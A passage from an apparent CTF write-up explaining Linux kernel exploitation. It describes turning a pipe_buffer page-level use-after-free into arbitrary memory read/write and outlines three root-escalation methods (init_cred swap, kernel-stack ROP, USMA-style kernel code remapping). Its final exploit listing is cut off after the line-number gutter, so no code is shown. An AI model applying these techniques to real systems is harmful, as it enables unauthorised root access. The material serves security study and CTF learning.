<p><img src="https://s2.loli.net/2023/05/02/lfmP8ZxicbjBNSR.png" alt="image.png"></p>
<p>As the <code>pipe_buffer</code> on the UAF page can be read &amp; write by us, we can just simply apply the <a target="_blank" rel="noopener" href="https://github.com/veritas501/pipe-primitive">pipe primitive</a> to perform the <strong>dirty pipe</strong> (That’s also how the NU1L team did to solve it). </p>
<p>But as the <code>pipe_buffer</code> on the UAF page can be read &amp; write by us, <strong>why shouldn’t we construct a second-level page-level UAF like this?</strong></p>
<p><img src="https://s2.loli.net/2023/05/02/yhNuT7kBj58K6gt.png" alt="secondary page-level UAF"></p>
<p>Why? The <code>page</code> struct  comes from a continuous array in fact, and each of them is related to a physical page. If we can tamper with a <code>pipe_buffer</code> ‘s pointer to the struct <code>page</code>, <strong>we can perform the arbitrary read and write in the whole memory space</strong>. I’ll show you how to do it now :  )</p>
<p>As the address of one <code>page</code> struct can be read by the UAF pipe (we can write some bytes before the exploitatino starts), we can easily overwrite another <code>pipe_buffer</code> ‘s pointer to this page to. We call it as the <strong>second-level UAF page</strong>. Then we close one of the pipe to free the page, spray the <code>pipe_buffer</code> on this page again. <strong>As the address of this page is known to us, we can tamper with the</strong> <code>pipe_buffer</code> <strong>on the page pointing to the page ie located directly, which allow the</strong> <code>pipe_buffer</code> <strong>on the second-level UAF page to tamper with itself</strong>. </p>
<p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt="third-level self-pointing pipe"></p>
<p>We can tamper with  <code>pipe_buffer.offset</code> and <code>pipe_buffer.len</code> there to relocate the start point of a pipe’s read and write, but these variables will be reassigned after the read &amp; write operation. So we use <strong>three such self-pointing pipe</strong> there to perform an infinite loop:</p>
<ul>
<li>The first pipe is used to do the arbitrary read and write in memory space by tampering with its pointer to the <code>page</code> struct.</li>
<li>The second pipe is used to change the start point of the third pipe, so that the third pipe cam tamper with the first and the second pipe.</li>
<li>The third pipe is used to tamper with the first and the second pipe, so that the first pipe can read &amp; write arbitrary physical page, and the second pipe can be used to tamper with the third pipe.</li>
</ul>
<p>With three self-pointing pipe like that, we can perform <strong>infinite arbitrary read and write in the whole memory space</strong> :  )</p>
<h2 id="Step-IV-Privilege-escalation"><a href="#Step-IV-Privilege-escalation" class="headerlink" title="Step.IV - Privilege escalation"></a>Step.IV - Privilege escalation</h2><p>With the ability to do the infinite arbitrary read and write in the whole memory space, we can escalate the privilege in many different ways. Here i’ll give out three meothds to do so.</p>
<h3 id="Method-1-Change-the-cred-of-current-task-struct-to-init-cred"><a href="#Method-1-Change-the-cred-of-current-task-struct-to-init-cred" class="headerlink" title="Method 1. Change the cred of current task_struct to init_cred"></a>Method 1. Change the cred of current task_struct to init_cred</h3><p>The <code>init_cred</code> is the <code>cred</code> with root privilege. If we can change current process’s <code>task_struct.cred</code> to it, we can obtain the root privilege. We can simply change the  <code>task_struct.comm</code> by  <code>prctl(PR_SET_NAME, &quot;arttnba3pwnn&quot;);</code> and search for the <code>task_struct</code> by the arbitrary read directly.</p>
<p>Sometimes the <code>init_cred</code> is not exported in  <code>/proc/kallsyms</code> and the base address of it is hard for us to get while debugging. Luckily all the <code>tasj_struct</code> forms a tree and we can easily find the <code>init</code> ‘s <code>task_struct</code> along the tree and get the address of <code>init_cred</code> .</p>
<p><img src="https://s2.loli.net/2023/05/02/jO5GwFnmSxkr3fg.png" alt="image.png"></p>
<h3 id="Methord-2-Read-the-page-table-to-resolve-the-physical-address-of-kernel-stack-write-the-kernel-stack-directly-to-perform-the-ROP"><a href="#Methord-2-Read-the-page-table-to-resolve-the-physical-address-of-kernel-stack-write-the-kernel-stack-directly-to-perform-the-ROP" class="headerlink" title="Methord 2. Read the page table to resolve the physical address of kernel stack , write the kernel stack directly to perform the ROP"></a>Methord 2. Read the page table to resolve the physical address of kernel stack , write the kernel stack directly to perform the ROP</h3><p>Though the CFI is enabled, <strong>we can still perform the code execution</strong>. As the address of current process’s page table can be obtained from the <code>mm_struct</code>, and the address of <code>mm_struct</code> and kernel stack can be obtained from the <code>task_struct</code> , we can easily resolve out the physical address of kernel stack and get the corresponding <code>page</code> struct. Thus we can write the ROP gadget directly on <code>pipe_write()</code> ‘s stack.</p>
<p><img src="https://s2.loli.net/2023/05/02/sRVcEax3wHApBW2.png" alt="image.png"></p>
<p>But this solution is not always available. Sometimes the control flow won’t be hijacked after the ROP gadgets are written into the kernel stack page. I don’t know the reason why it happened yet :  (</p>
<h3 id="Method-3-Read-the-page-table-to-resolve-the-physical-address-of-kernel-code-map-it-to-the-user-space-to-overwrite-the-kernel-code-USMA"><a href="#Method-3-Read-the-page-table-to-resolve-the-physical-address-of-kernel-code-map-it-to-the-user-space-to-overwrite-the-kernel-code-USMA" class="headerlink" title="Method 3. Read the page table to resolve the physical address of kernel code, map it to the user space to overwrite the kernel code(USMA)"></a>Method 3. Read the page table to resolve the physical address of kernel code, map it to the user space to overwrite the kernel code(USMA)</h3><p>It may also be a good way to overwrite the kernel code segment to perform the arbitrary code execution, but the <code>pipe</code> actually writes a page by the direct mapping area, <strong>where the kernel code area is read-only.</strong></p>
<p>But what we want to do in fact is to <strong>write the corresponding physical page</strong>, and the page table is writable. So <strong>we can simply tamper with the page table to establish a new mapping to kernel code’s physical pages</strong> :  ) </p>
<p>This is actually the same way as the <a target="_blank" rel="noopener" href="https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-YongLiu-USMA-Share-Kernel-Code.pdf">USMA</a> does.</p>
<p><img src="https://s2.loli.net/2023/05/02/U3BEbFTsZiy48NQ.png" alt="image.png"></p>
<h2 id="Final-Exploitation"><a href="#Final-Exploitation" class="headerlink" title="Final Exploitation"></a>Final Exploitation</h2><p>Here is the final code for the explotation with three different ways to obtain the root privilege. <strong>The totabl reliability is about 75%.</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span 